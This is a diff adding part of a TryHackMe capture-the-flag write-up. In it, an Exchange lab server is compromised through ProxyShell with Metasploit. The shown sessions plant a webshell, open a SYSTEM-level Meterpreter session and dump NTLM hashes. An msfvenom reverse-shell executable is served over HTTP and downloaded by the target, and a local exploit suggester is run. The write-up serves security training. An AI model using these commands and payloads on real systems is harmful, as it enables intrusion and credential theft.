@@ -708,3 +708,358 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
    LPORT     4444             yes       The listen port
 
 Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Powershell
+
+View the full module info with the info, or info -d command.
+```
+```text
+- msf6 exploit(windows/http/exchange_proxylogon_rce) > set RHOSTS 10.10.61.189
+RHOSTS => 10.10.61.189
+```
+```text
+- msf6 exploit(windows/http/exchange_proxylogon_rce) > set EMAIL joe@thm.local
+EMAIL => joe@thm.local
+```
+```text
+- msf6 exploit(windows/http/exchange_proxylogon_rce) > run
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Using auxiliary/scanner/http/exchange_proxylogon as check
+[-] https://10.10.61.189:443 - The target is not vulnerable to CVE-2021-26855.
+[*] Scanned 1 of 1 hosts (100% complete)
+[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+```
+```text
+- msf6 exploit(windows/http/exchange_proxylogon_rce) > search microsoft exchange
+
+Matching Modules
+================
+```
+```text
+- #   Name                                                          Disclosure Date  Rank       Check  Description
+   -   ----                                                          ---------------  ----       -----  -----------
+   0   exploit/windows/http/exchange_ecp_viewstate                          excellent  Yes    Exchange Control Panel ViewState Deserialization
+   1   auxiliary/scanner/http/exchange_web_server_pushsubscription          normal     No     Microsoft Exchange Privilege Escalation Exploit
+   2   auxiliary/gather/exchange_proxylogon_collector                       normal     No     Microsoft Exchange ProxyLogon Collector
+   3   exploit/windows/http/exchange_proxylogon_rce                         excellent  Yes    Microsoft Exchange ProxyLogon RCE
+   4   auxiliary/scanner/http/exchange_proxylogon                           normal     No     Microsoft Exchange ProxyLogon Scanner
+   5   exploit/windows/http/exchange_proxynotshell_rce                      excellent  Yes    Microsoft Exchange ProxyNotShell RCE
+   6   exploit/windows/http/exchange_proxyshell_rce                         excellent  Yes    Microsoft Exchange ProxyShell RCE
+   7   exploit/windows/http/exchange_chainedserializationbinder_rce         excellent  Yes    Microsoft Exchange Server ChainedSerializationBinder RCE
+   8   exploit/windows/http/exchange_ecp_dlp_policy                         excellent  Yes    Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE
+   9   exploit/linux/local/cve_2021_38648_omigod                     2021-09-14       excellent  Yes    Microsoft OMI Management Interface Authentication Bypass
+   10  auxiliary/gather/office365userenum                                   normal     No     Office 365 User Enumeration
+   11  auxiliary/scanner/http/owa_iis_internal_ip                           normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
+   12  post/windows/gather/exchange                                                   normal     No     Windows Gather Exchange Server Mailboxes
+
+Interact with a module by name or index. For example info 12, use 12 or use post/windows/gather/exchange
+```
+```text
+- msf6 exploit(windows/http/exchange_proxylogon_rce) > use 6
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+```
+```text
+- msf6 exploit(windows/http/exchange_proxyshell_rce) > show options
+
+Module options (exploit/windows/http/exchange_proxyshell_rce):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   EMAIL                              no        A known email address for this organization
+   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT             443              yes       The target port (TCP)
+   SSL               true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                            no        The URI to use for this exploit (default is random)
+   UseAlternatePath  false            yes       Use the IIS root dir as alternate path
+   VHOST                              no        HTTP server virtual host
+
+   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all a
+                                       ddresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.8.19.103      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Powershell
+
+View the full module info with the info, or info -d command.
+```
+```text
+- msf6 exploit(windows/http/exchange_proxyshell_rce) > set RHOSTS 10.10.61.189
+RHOSTS => 10.10.61.189
+```
+```text
+- msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL joe@thm.local
+EMAIL => joe@thm.local
+```
+```text
+- msf6 exploit(windows/http/exchange_proxyshell_rce) > run
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Attempt to exploit for CVE-2021-34473
+[*] Retrieving backend FQDN over RPC request
+[*] Internal server name: win-12ouo7a66m7.thm.local
+[-] Exploit aborted due to failure: not-found: No Autodiscover information was found
+[*] Exploit completed, but no session was created.
+```
+```text
+- msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL dev-infrastracture-team@thm.local
+EMAIL => dev-infrastracture-team@thm.local
+```
+```text
+- msf6 exploit(windows/http/exchange_proxyshell_rce) > run
+
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Attempt to exploit for CVE-2021-34473
+[*] Retrieving backend FQDN over RPC request
+[*] Internal server name: win-12ouo7a66m7.thm.local
+[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
+[+] Successfully assigned the 'Mailbox Import Export' role
+[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
+[*] Saving a draft email with subject 'dfcULFY9W' containing the attachment with the embedded webshell
+[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\vOtEHjiGN.aspx
+[*] Waiting for the export request to complete...
+[+] The mailbox export request has completed
+[*] Triggering the payload
+[*] Sending stage (200774 bytes) to 10.10.61.189
+[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\vOtEHjiGN.aspx
+[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.61.189:10923) -0400
+[*] Removing the mailbox export request
+[*] Removing the draft email
+```
+```text
+- meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+```text
+- meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:becd6ba4674b21daa8754fb35abeec4b:::
+$231000-O0QPBLAP47AA:1122:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_fe3ac6e6c5c048879:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_9d95c1b345b24820a:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_fff1c36ebaee496d9:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_0bcc8f43b5d449549:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_de8cf2884b5344449:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_8732593a4dab45bab:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_01c36984a0954584b:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_77808a1914dd4685a:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_ccc03880b6df44e2b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HealthMailbox5d7068d:1134:aad3b435b51404eeaad3b435b51404ee:37abce6e37210ec39f229531f1f8bdd2:::
+HealthMailbox451693b:1135:aad3b435b51404eeaad3b435b51404ee:4bc9c5bbad68f9baeb1d876847f4ed2c:::
+HealthMailboxb417c9a:1136:aad3b435b51404eeaad3b435b51404ee:d9ecb7e1e395edecabe99a6eb1603e0d:::
+HealthMailbox8e51e05:1137:aad3b435b51404eeaad3b435b51404ee:f3c329605223b757b66c88aaeb15c810:::
+HealthMailbox07b8995:1138:aad3b435b51404eeaad3b435b51404ee:efbb97e093ef92096912f6006933ccf4:::
+HealthMailbox82636a0:1139:aad3b435b51404eeaad3b435b51404ee:82b9f1f402ea6af44c03699ed824fc23:::
+HealthMailboxd070f22:1140:aad3b435b51404eeaad3b435b51404ee:237e125929afa33eeea649baa40eab6e:::
+HealthMailbox878368d:1141:aad3b435b51404eeaad3b435b51404ee:e7634c47e2ff6eafeca140aba65120ab:::
+HealthMailbox661f7fa:1142:aad3b435b51404eeaad3b435b51404ee:89becb5b87b903a9ae142feb8087cde5:::
+HealthMailbox7592f90:1143:aad3b435b51404eeaad3b435b51404ee:d44648e33d9c1d1ed54bca14ce4dab83:::
+dev:1144:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
+HealthMailbox079218d:1147:aad3b435b51404eeaad3b435b51404ee:8b5ad17e6d2e17ad03c01ac04c46b381:::
+admin:1149:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+WIN-12OUO7A66M7$:1000:aad3b435b51404eeaad3b435b51404ee:4862262e1bd19aae279c269e2043b836:::
+```
+```text
+- meterpreter > search flag.txt
+[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
+```
+```text
+- meterpreter > search -f flag.txt
+Found 1 result...
+=================
+
+Path                                       Size (bytes)  Modified (UTC)
+----                                       ------------  --------------
+c:\Users\Administrator\Documents\flag.txt  35             -0500
+```
+```text
+- meterpreter > cat 'c:\Users\Administrator\Documents\flag.txt'
+THM{Looking_Back_Is_Not_Always_Bad}
+
+another way
+
+https://www.kaspersky.es/blog/mysterysnail-cve-2021-40449/26246/
+
+┌──(witty㉿kali)-[/tmp]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.19.103 LPORT="4444" -f exe -o hi.exe      
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: hi.exe
+
+┌──(witty㉿kali)-[/tmp]
+└─$ file hi.exe 
+hi.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
+
+┌──(witty㉿kali)-[/tmp]
+└─$ python3 -m http.server 1234         
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.61.189 - - [07/Apr/2023 13:10:20] "GET /hi.exe HTTP/1.1" 200 -
+
+PS C:\Users\dev> cd Downloads
+PS C:\Users\dev\Downloads> dir
+PS C:\Users\dev\Downloads> iwr http://10.8.19.103:1234/hi.exe -outfile hi.exe
+PS C:\Users\dev\Downloads> dir
+PS C:\Users\dev\Downloads> iwr http://10.8.19.103:1234/hi.exe 
+PS C:\Users\dev\Downloads> dir
+
+┌──(witty㉿kali)-[/tmp]
+└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.8.19.103; set LPORT '4444'; exploit"
+[sudo] password for witty: 
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+LHOST => 10.8.19.103
+LPORT => 4444
+[*] Started reverse TCP handler on 10.8.19.103:4444 
+[*] Sending stage (200774 bytes) to 10.10.61.189
+[*] Meterpreter session 1 opened (10.8.19.103:4444 -> 10.10.61.189:11553) -0400
+```
+```text
+- meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+```text
+- meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:becd6ba4674b21daa8754fb35abeec4b:::
+$231000-O0QPBLAP47AA:1122:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_fe3ac6e6c5c048879:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_9d95c1b345b24820a:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_fff1c36ebaee496d9:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_0bcc8f43b5d449549:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_de8cf2884b5344449:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_8732593a4dab45bab:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_01c36984a0954584b:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_77808a1914dd4685a:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SM_ccc03880b6df44e2b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HealthMailbox5d7068d:1134:aad3b435b51404eeaad3b435b51404ee:37abce6e37210ec39f229531f1f8bdd2:::
+HealthMailbox451693b:1135:aad3b435b51404eeaad3b435b51404ee:4bc9c5bbad68f9baeb1d876847f4ed2c:::
+HealthMailboxb417c9a:1136:aad3b435b51404eeaad3b435b51404ee:d9ecb7e1e395edecabe99a6eb1603e0d:::
+HealthMailbox8e51e05:1137:aad3b435b51404eeaad3b435b51404ee:f3c329605223b757b66c88aaeb15c810:::
+HealthMailbox07b8995:1138:aad3b435b51404eeaad3b435b51404ee:efbb97e093ef92096912f6006933ccf4:::
+HealthMailbox82636a0:1139:aad3b435b51404eeaad3b435b51404ee:82b9f1f402ea6af44c03699ed824fc23:::
+HealthMailboxd070f22:1140:aad3b435b51404eeaad3b435b51404ee:237e125929afa33eeea649baa40eab6e:::
+HealthMailbox878368d:1141:aad3b435b51404eeaad3b435b51404ee:e7634c47e2ff6eafeca140aba65120ab:::
+HealthMailbox661f7fa:1142:aad3b435b51404eeaad3b435b51404ee:89becb5b87b903a9ae142feb8087cde5:::
+HealthMailbox7592f90:1143:aad3b435b51404eeaad3b435b51404ee:d44648e33d9c1d1ed54bca14ce4dab83:::
+dev:1144:aad3b435b51404eeaad3b435b51404ee:bd2a588da7537a43413f220ad79b3ec8:::
+HealthMailbox079218d:1147:aad3b435b51404eeaad3b435b51404ee:8b5ad17e6d2e17ad03c01ac04c46b381:::
+admin:1149:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+WIN-12OUO7A66M7$:1000:aad3b435b51404eeaad3b435b51404ee:4862262e1bd19aae279c269e2043b836:::
+```
+```text
+- meterpreter > cat 'c:\Users\Administrator\Documents\flag.txt'
+THM{Looking_Back_Is_Not_Always_Bad}
+```
+```text
+- meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.61.189 - Collecting local exploits for x64/windows...
+[*] 10.10.61.189 - 181 exploit checks are being tried...
+[+] 10.10.61.189 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
+[+] 10.10.61.189 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
+[+] 10.10.61.189 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
+[+] 10.10.61.189 - exploit/windows/local/cve_2020_17136: The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!
+[+] 10.10.61.189 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
+[+] 10.10.61.189 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
+[+] 10.10.61.189 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 10.10.61.189 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[*] Running check method for exploit 42 / 42
+[*] 10.10.61.189 - Valid modules for session 1:
+============================
+```
+```text
+- #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
+ 2   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/cve_2020_17136                           Yes                      The target appears to be vulnerable. A vulnerable Windows 10 v1809 build was detected!
+ 5   exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
+ 6   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 8   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 9   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
+ 10  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
+ 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
+ 12  exploit/windows/local/bypassuac_dotnet_profiler                No                       The target is not exploitable.
+ 13  exploit/windows/local/bypassuac_eventvwr                       No                       The target is not exploitable.
+ 14  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
+ 15  exploit/windows/local/bypassuac_sdclt                          No                       The target is not exploitable.
+ 16  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
+ 17  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
+ 18  exploit/windows/local/capcom_sys_exec                          No                       Cannot reliably check exploitability.
+ 19  exploit/windows/local/cve_2019_1458_wizardopium                No                       The target is not exploitable.
+ 20  exploit/windows/local/cve_2020_0796_smbghost                   No                       The target is not exploitable.
+ 21  exploit/windows/local/cve_2020_1054_drawiconex_lpe             No                       The target is not exploitable. No target for win32k.sys version 10.0.17763.1
+ 22  exploit/windows/local/cve_2020_1313_system_orchestrator        No                       The target is not exploitable.
+ 23  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.
+ 24  exploit/windows/local/cve_2022_21882_win32k                    No                       The target is not exploitable.
+ 25  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
+ 26  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
+ 27  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
+ 28  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
+ 29  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows 2016+ (10.0 Build 17763). is not vulnerable
+ 30  exploit/windows/local/ms14_058_track_popup_menu                No                       Cannot reliably check exploitability.
+ 31  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
+ 32  exploit/windows/local/ms15_078_atmfd_bof                       No                       Cannot reliably check exploitability.
+ 33  exploit/windows/local/ms16_014_wmi_recv_notif                  No                       The target is not exploitable.
+ 34  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
+ 35  exploit/windows/local/ntapphelpcachecontrol                    No                       The target is not exploitable.
+ 36  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
+ 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
+ 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
+ 39  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.
+ 40  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
+ 41  exploit/windows/local/virtual_box_opengl_escape                No                       The target is not exploitable.
+ 42  exploit/windows/local/webexec                                  No                       The check raised an exception.
+```
+```text
+- meterpreter > run exploit/windows/local/cve_2021_40449
+```
+```text
+- meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+- What is the service user flag?
+- Have you checked all the paths?
+- ***THM{Security_Through_Obscurity_Is_Not_A_Defense}***
+- What is the user flag?
+- Reading can change your perspective!
+- ***THM{Stop_Reading_Start_Doing}***
+- What is the root flag?
+- All the way back! Where did you start?
+- ***THM{Looking_Back_Is_Not_Always_Bad}***
+
+## Notes / Lessons Learned
+[[Outlook NTLM Leak]]
+
